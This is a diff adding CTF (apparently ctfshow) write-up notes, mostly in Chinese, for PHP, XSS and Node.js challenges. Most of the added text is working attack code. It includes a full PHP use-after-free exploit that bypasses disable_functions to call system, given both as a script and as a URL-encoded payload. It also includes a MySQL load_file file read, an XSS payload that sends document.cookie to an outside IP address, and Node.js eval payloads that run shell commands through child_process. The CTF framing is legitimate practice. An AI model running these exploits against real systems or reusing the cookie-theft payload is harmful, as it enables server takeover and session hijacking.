@@ -988,6 +988,287 @@ if(isset($_GET['c'])){
 
 
 
+
+
+### web72
+
+use the glob://
+
+```
+c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
+```
+
+
+
+uaf script:
+
+```
+
+c=function ctfshow($cmd) {
+    global $abc, $helper, $backtrace;
+
+    class Vuln {
+        public $a;
+        public function __destruct() {
+            global $backtrace;
+            unset($this->a);
+            $backtrace = (new Exception)->getTrace();
+            if(!isset($backtrace[1]['args'])) {
+                $backtrace = debug_backtrace();
+            }
+        }
+    }
+
+    class Helper {
+        public $a, $b, $c, $d;
+    }
+
+    function str2ptr(&$str, $p = 0, $s = 8) {
+        $address = 0;
+        for($j = $s-1; $j >= 0; $j--) {
+            $address <<= 8;
+            $address |= ord($str[$p+$j]);
+        }
+        return $address;
+    }
+
+    function ptr2str($ptr, $m = 8) {
+        $out = "";
+        for ($i=0; $i < $m; $i++) {
+            $out .= sprintf("%c",($ptr & 0xff));
+            $ptr >>= 8;
+        }
+        return $out;
+    }
+
+    function write(&$str, $p, $v, $n = 8) {
+        $i = 0;
+        for($i = 0; $i < $n; $i++) {
+            $str[$p + $i] = sprintf("%c",($v & 0xff));
+            $v >>= 8;
+        }
+    }
+
+    function leak($addr, $p = 0, $s = 8) {
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper->a);
+        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+        return $leak;
+    }
+
+    function parse_elf($base) {
+        $e_type = leak($base, 0x10, 2);
+
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+
+        for($i = 0; $i < $e_phnum; $i++) {
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+
+            if($p_type == 1 && $p_flags == 6) {
+
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            } else if($p_type == 1 && $p_flags == 5) {
+                $text_size = $p_memsz;
+            }
+        }
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    }
+
+    function get_basic_funcs($base, $elf) {
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i < $data_size / 8; $i++) {
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            } else continue;
+
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                
+                if($deref != 0x786568326e6962)
+                    continue;
+            } else continue;
+
+            return $data_addr + $i * 8;
+        }
+    }
+
+    function get_binary_base($binary_leak) {
+        $base = 0;
+        $start = $binary_leak & 0xfffffffffffff000;
+        for($i = 0; $i < 0x1000; $i++) {
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) {
+                return $addr;
+            }
+        }
+    }
+
+    function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+
+            if($f_name == 0x6d6574737973) {
+                return leak($addr + 8);
+            }
+            $addr += 0x20;
+        } while($f_entry != 0);
+        return false;
+    }
+
+    function trigger_uaf($arg) {
+
+        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+        $vuln = new Vuln();
+        $vuln->a = $arg;
+    }
+
+    if(stristr(PHP_OS, 'WIN')) {
+        die('This PoC is for *nix systems only.');
+    }
+
+    $n_alloc = 10;
+    $contiguous = [];
+    for($i = 0; $i < $n_alloc; $i++)
+        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+
+    trigger_uaf('x');
+    $abc = $backtrace[1]['args'][0];
+
+    $helper = new Helper;
+    $helper->b = function ($x) { };
+
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
+        die("UAF failed");
+    }
+
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj = str2ptr($abc, 0x20);
+
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) {
+        die("Couldn't determine binary base address");
+    }
+
+    if(!($elf = parse_elf($base))) {
+        die("Couldn't parse ELF header");
+    }
+
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+        die("Couldn't get basic_functions address");
+    }
+
+    if(!($zif_system = get_system($basic_funcs))) {
+        die("Couldn't get zif_system address");
+    }
+
+
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i < 0x110; $i += 8) {
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    }
+
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4);
+    write($abc, 0xd0 + 0x68, $zif_system);
+
+    ($helper->b)($cmd);
+    exit();
+}
+
+ctfshow("cat /flag0.txt");exit();
+```
+
+
+
+payload:
+
+```
+c=function%20ctfshow(%24cmd)%20%7b%20%20%20%20%20global%20%24abc%2c%20%24helper%2c%20%24backtrace%3b%20%20%20%20%20%20class%20vuln%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%3b%20%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3ea)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20(new%20exception)-%3egettrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5b1%5d%5b'args'%5d))%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3d%20debug_backtrace()%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20class%20helper%20%7b%20%20%20%20%20%20%20%20%20public%20%24a%2c%20%24b%2c%20%24c%2c%20%24d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20str2ptr(%26%24str%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24address%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24j%20%3d%20%24s-1%3b%20%24j%20%3e%3d%200%3b%20%24j--)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3c%3c%3d%208%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7c%3d%20ord(%24str%5b%24p%2b%24j%5d)%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24address%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20ptr2str(%24ptr%2c%20%24m%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24out%20%3d%20%22%22%3b%20%20%20%20%20%20%20%20%20for%20(%24i%3d0%3b%20%24i%20%3c%20%24m%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3d%20sprintf(%22%25c%22%2c(%24ptr%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20return%20%24out%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20write(%26%24str%2c%20%24p%2c%20%24v%2c%20%24n%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20%24i%20%3d%200%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24str%5b%24p%20%2b%20%24i%5d%20%3d%20sprintf(%22%25c%22%2c(%24v%20%26%200xff))%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3e%3e%3d%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20leak(%24addr%2c%20%24p%20%3d%200%2c%20%24s%20%3d%208)%20%7b%20%20%20%20%20%20%20%20%20global%20%24abc%2c%20%24helper%3b%20%20%20%20%20%20%20%20%20write(%24abc%2c%200x68%2c%20%24addr%20%2b%20%24p%20-%200x10)%3b%20%20%20%20%20%20%20%20%20%24leak%20%3d%20strlen(%24helper-%3ea)%3b%20%20%20%20%20%20%20%20%20if(%24s%20!%3d%208)%20%7b%20%24leak%20%25%3d%202%20%3c%3c%20(%24s%20*%208)%20-%201%3b%20%7d%20%20%20%20%20%20%20%20%20return%20%24leak%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20parse_elf(%24base)%20%7b%20%20%20%20%20%20%20%20%20%24e_type%20%3d%20leak(%24base%2c%200x10%2c%202)%3b%20%20%20%20%20%20%20%20%20%20%24e_phoff%20%3d%20leak(%24base%2c%200x20)%3b%20%20%20%20%20%20%20%20%20%24e_phentsize%20%3d%20leak(%24base%2c%200x36%2c%202)%3b%20%20%20%20%20%20%20%20%20%24e_phnum%20%3d%20leak(%24base%2c%200x38%2c%202)%3b%20%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24e_phnum%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3d%20%24base%20%2b%20%24e_phoff%20%2b%20%24i%20*%20%24e_phentsize%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3d%20leak(%24header%2c%200%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3d%20leak(%24header%2c%204%2c%204)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3d%20leak(%24header%2c%200x10)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3d%20leak(%24header%2c%200x28)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%206)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3d%20%24e_type%20%3d%3d%202%20%3f%20%24p_vaddr%20%3a%20%24base%20%2b%20%24p_vaddr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20if(%24p_type%20%3d%3d%201%20%26%26%20%24p_flags%20%3d%3d%205)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3d%20%24p_memsz%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20if(!%24data_addr%20%7c%7c%20!%24text_size%20%7c%7c%20!%24data_size)%20%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%20%20%20%20%20return%20%5b%24data_addr%2c%20%24text_size%2c%20%24data_size%5d%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_basic_funcs(%24base%2c%20%24elf)%20%7b%20%20%20%20%20%20%20%20%20list(%24data_addr%2c%20%24text_size%2c%20%24data_size)%20%3d%20%24elf%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24data_size%20%2f%208%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20%24i%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x746e6174736e6f63)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24data_addr%2c%20(%24i%20%2b%204)%20*%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3e%200%20%26%26%20%24leak%20-%20%24base%20%3c%20%24data_addr%20-%20%24base)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3d%20leak(%24leak)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3d%200x786568326e6962)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20else%20continue%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2b%20%24i%20*%208%3b%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7b%20%20%20%20%20%20%20%20%20%24base%20%3d%200%3b%20%20%20%20%20%20%20%20%20%24start%20%3d%20%24binary_leak%20%26%200xfffffffffffff000%3b%20%20%20%20%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x1000%3b%20%24i%2b%2b)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24start%20-%200x1000%20*%20%24i%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3d%20leak(%24addr%2c%200%2c%207)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3d%3d%200x10102464c457f)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%7d%20%20%20%20%20%20function%20get_system(%24basic_funcs)%20%7b%20%20%20%20%20%20%20%20%20%24addr%20%3d%20%24basic_funcs%3b%20%20%20%20%20%20%20%20%20do%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3d%20leak(%24addr)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3d%20leak(%24f_entry%2c%200%2c%206)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3d%3d%200x6d6574737973)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2b%208)%3b%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2b%3d%200x20%3b%20%20%20%20%20%20%20%20%20%7d%20while(%24f_entry%20!%3d%200)%3b%20%20%20%20%20%20%20%20%20return%20false%3b%20%20%20%20%20%7d%20%20%20%20%20%20function%20trigger_uaf(%24arg)%20%7b%20%20%20%20%20%20%20%20%20%20%24arg%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20%20%20%20%24vuln%20%3d%20new%20vuln()%3b%20%20%20%20%20%20%20%20%20%24vuln-%3ea%20%3d%20%24arg%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(stristr(php_os%2c%20'win'))%20%7b%20%20%20%20%20%20%20%20%20die('this%20poc%20is%20for%20*nix%20systems%20only.')%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24n_alloc%20%3d%2010%3b%20%20%20%20%20%20%24contiguous%20%3d%20%5b%5d%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%20%24n_alloc%3b%20%24i%2b%2b)%20%20%20%20%20%20%20%20%20%24contiguous%5b%5d%20%3d%20str_shuffle('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')%3b%20%20%20%20%20%20trigger_uaf('x')%3b%20%20%20%20%20%24abc%20%3d%20%24backtrace%5b1%5d%5b'args'%5d%5b0%5d%3b%20%20%20%20%20%20%24helper%20%3d%20new%20helper%3b%20%20%20%20%20%24helper-%3eb%20%3d%20function%20(%24x)%20%7b%20%7d%3b%20%20%20%20%20%20if(strlen(%24abc)%20%3d%3d%2079%20%7c%7c%20strlen(%24abc)%20%3d%3d%200)%20%7b%20%20%20%20%20%20%20%20%20die(%22uaf%20failed%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%24closure_handlers%20%3d%20str2ptr(%24abc%2c%200)%3b%20%20%20%20%20%24php_heap%20%3d%20str2ptr(%24abc%2c%200x58)%3b%20%20%20%20%20%24abc_addr%20%3d%20%24php_heap%20-%200xc8%3b%20%20%20%20%20%20write(%24abc%2c%200x60%2c%202)%3b%20%20%20%20%20write(%24abc%2c%200x70%2c%206)%3b%20%20%20%20%20%20write(%24abc%2c%200x10%2c%20%24abc_addr%20%2b%200x60)%3b%20%20%20%20%20write(%24abc%2c%200x18%2c%200xa)%3b%20%20%20%20%20%20%24closure_obj%20%3d%20str2ptr(%24abc%2c%200x20)%3b%20%20%20%20%20%20%24binary_leak%20%3d%20leak(%24closure_handlers%2c%208)%3b%20%20%20%20%20if(!(%24base%20%3d%20get_binary_base(%24binary_leak)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20determine%20binary%20base%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24elf%20%3d%20parse_elf(%24base)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20parse%20elf%20header%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24basic_funcs%20%3d%20get_basic_funcs(%24base%2c%20%24elf)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20basic_functions%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20if(!(%24zif_system%20%3d%20get_system(%24basic_funcs)))%20%7b%20%20%20%20%20%20%20%20%20die(%22couldn't%20get%20zif_system%20address%22)%3b%20%20%20%20%20%7d%20%20%20%20%20%20%20%24fake_obj_offset%20%3d%200xd0%3b%20%20%20%20%20for(%24i%20%3d%200%3b%20%24i%20%3c%200x110%3b%20%24i%20%2b%3d%208)%20%7b%20%20%20%20%20%20%20%20%20write(%24abc%2c%20%24fake_obj_offset%20%2b%20%24i%2c%20leak(%24closure_obj%2c%20%24i))%3b%20%20%20%20%20%7d%20%20%20%20%20%20write(%24abc%2c%200x20%2c%20%24abc_addr%20%2b%20%24fake_obj_offset)%3b%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x38%2c%201%2c%204)%3b%20%20%20%20%20%20write(%24abc%2c%200xd0%20%2b%200x68%2c%20%24zif_system)%3b%20%20%20%20%20%20%20(%24helper-%3eb)(%24cmd)%3b%20%20%20%20%20exit()%3b%20%7d%20%20ctfshow(%22cat%20%2fflag0.txt%22)%3bexit()%3b%20%3f%3e
+```
+
+
+
+### web75
+
+还是一样通过glob协议找到文件为flag36.txt，但是include限制文件夹，之前的uaf poc因为strlen被禁了获取不到system地址也没法用了，但是既然php受限制，那么mysql的load_file函数呢?
+
+payload:
+
+```
+c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
+'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
+{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
+>getMessage();exit(0);}exit(0);
+```
+
+
+
+```
+try {
+	# 创建 PDO 实例, 连接 MySQL 数据库
+	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
+	
+	# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。
+	foreach($dbh->query('select load_file("/flag36.txt")') as $row) {
+		echo($row[0])."|";
+	}
+	
+	$dbh = null;
+}
+
+catch (PDOException $e) {
+	echo $e->getMessage();exit(0);
+}
+
+exit(0);
+
+```
+
+
+
+### web77
+
+use the glob://
+
+```
+c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
+```
+
+flag在flag36x.txt中，准备读取。
+
+c=$a='/flag36x > 1.txt';exit();
+
+
+
 ## 文件包含
 
 文件包含系列开始
@@ -1966,6 +2247,42 @@ payload:
 > 理论上，见框就插。
 
 ```
-<body/**/onload="document.location.herf='http://we1wmh.ceye.io/'+document.cookie"></body>
+<body/onload=location.href="http://124.223.171.164/home/chenshi/x.php?cookie="+document.cookie>
+```
+
+
+
+## node.js
+
+### web334
+
+文件里全暴露了
+
+
+
+### web335
+
+```
+?eval=require('child_process').execSync('ls');
+```
+
+noScript显示这是XSS攻击。文件在fl00g.txt中
+
+```
+?eval=require('child_process').execSync('cat fl00g.txt');
+```
+
+
+
+### web336
+
+```
+?eval=require('child_process').spawnSync('ls').stdout.toString()
+```
+
+flag在fl001g.txt中
+
+```
+?eval=require('child_process').spawnSync('cat fl001g.txt').stdout.toString()
 ```
 
